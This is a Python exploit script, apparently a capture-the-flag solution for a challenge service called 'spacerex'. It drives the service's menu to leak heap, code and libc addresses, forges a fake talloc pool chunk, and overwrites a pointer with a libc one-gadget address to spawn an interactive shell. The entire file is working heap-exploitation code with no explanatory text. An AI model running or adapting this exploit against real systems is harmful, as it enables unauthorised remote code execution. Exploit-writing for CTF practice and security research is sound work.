#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import time
import re

host = "10.211.55.16"
port = 8888

#host = "spacerex.bostonkey.party"
#port = 6666

sock = make_conn(host,port)

def addplant(sock,name,choice,ring = 1,co = None):
    recvuntil(sock,"_")
    sendline(sock,name)
    recvuntil(sock,"_")
    if co :
        sendline(sock,co)
    else :
        sendline(sock,"123")
    recvuntil(sock,"_")
    sendline(sock,"234")
    recvuntil(sock,"_")
    sendline(sock,"35")
    recvuntil(sock,"_")
    sendline(sock,"567")
    recvuntil(sock,"_")
    sendline(sock,"888")
    recvuntil(sock,"_")
    sendline(sock,"1")
    recvuntil(sock,"_")
    sendline(sock,"100")
    recvuntil(sock,"_")
    sendline(sock,"0")
    recvuntil(sock,"_")
    sendline(sock,"0")
    recvuntil(sock,"_")
    sendline(sock,"0")
    recvuntil(sock,"_")
    sendline(sock,"0")
    recvuntil(sock,"_")
    sendline(sock,"0")
    recvuntil(sock,"_")
    sendline(sock,"0")
    recvuntil(sock,"_")
    sendline(sock,"0")
    recvuntil(sock,"_")
    sendline(sock,choice)
    if choice == "R" : 
        recvuntil(sock,"_")
        sendline(sock,str(ring))
    if choice == "M" :
        recvuntil(sock,"_")
        sendline(sock,"1")
        recvuntil(sock,"_")
        sendline(sock,"100")
        recvuntil(sock,"_")
        sendline(sock,ring)

def create(sock,name,types,temperature,plant = 0,plantname = None,choice = None,ring= None):
    recvuntil(sock,"__")
    sendline(sock,"1")
    recvuntil(sock,"_")
    sendline(sock,name)
    recvuntil(sock,"_")
    sendline(sock,str(types))
    recvuntil(sock,"_")
    sendline(sock,str(temperature))
    recvuntil(sock,"_")
    sendline(sock,str(plant))
    if plant :
        addplant(sock,plantname,choice,ring)

def display(sock) :
    recvuntil(sock,"__")
    sendline(sock,"5")
    recvuntil(sock,"_")
    sendline(sock,"-1")
    recvuntil(sock,"_")
    sendline(sock,"y")
    data = recvuntil(sock,"Exit")
    return data

create(sock,"ddaa",1,13212,1,"orange","R",str(13371337))
recvuntil(sock,"_")
sendline(sock,"6")
recvuntil(sock,"_")
sendline(sock,"ddaa")

recvuntil(sock,"__")
sendline(sock,"6")
addplant(sock,"mehhh","M","aaa")

recvuntil(sock,"__")
sendline(sock,"2")
recvuntil(sock,"_")
sendline(sock,"orange")

data = display(sock).split("\n")
rawheapptr = data[13].split("%")
rawtxtptr = data[19].split("%")
rawlibcptr = data[27].split("%")

heapptr = 0
for i in range(8):

    if i == 0:
        heapptr = int(rawheapptr[i].split()[1])
        txtptr = int(rawtxtptr[i].split()[1])
        libcptr = int(rawlibcptr[i].split()[1])
    else :
        heapptr += int(rawheapptr[i].strip()) << i*8
        txtptr += int(rawtxtptr[i].strip()) << i*8
        libcptr += int(rawlibcptr[i].strip()) << i*8

heapbase = heapptr - 0x4d40
codebase = txtptr - 0x40f3
libc = libcptr - 0x3c4c58 + 0x64a0
#libc = libcptr - 0x3c4c58
print "heap :",hex(heapbase)
print "text :",hex(codebase)
print "libc :",hex(libc)
magic = libc + 0xe681d
chunkaddr = heapbase + 0x56e0 + 0x20

talloc_chunk = pack(0) #padding
talloc_chunk += pack(libc+0x3be740-0x68) #talloc_pool_hdr end
talloc_chunk += pack(0) #talloc_pool_hdr cnt
talloc_chunk += pack(0x200) #pool size
talloc_chunk += pack(0) 
talloc_chunk += pack(0x424242424242)# talloc_chunk size
talloc_chunk += pack(0) #prev
talloc_chunk += pack(0) #parent
talloc_chunk += pack(0) #child 
talloc_chunk += pack(0) #refs
talloc_chunk += pack(0) #dtor
talloc_chunk += pack(0) #name
talloc_chunk += pack(70) #size
talloc_chunk += pack(0xe8150c74) #flags | TALLOC_FLAG_POOL
talloc_chunk += pack(0)


recvuntil(sock,"__")
sendline(sock,"6")
addplant(sock,"meh","M",talloc_chunk)
recvuntil(sock,"__")
sendline(sock,"6")
addplant(sock,"meh33","R",chunkaddr+0x60)

recvuntil(sock,"__")
sendline(sock,"3")
recvuntil(sock,"_")
sendline(sock,"meh33")
recvuntil(sock,"_")
sendline(sock,"123")
recvuntil(sock,"_")
sendline(sock,pack(magic))
recvuntil(sock,"__")
sendline(sock,"6")

inter(sock)
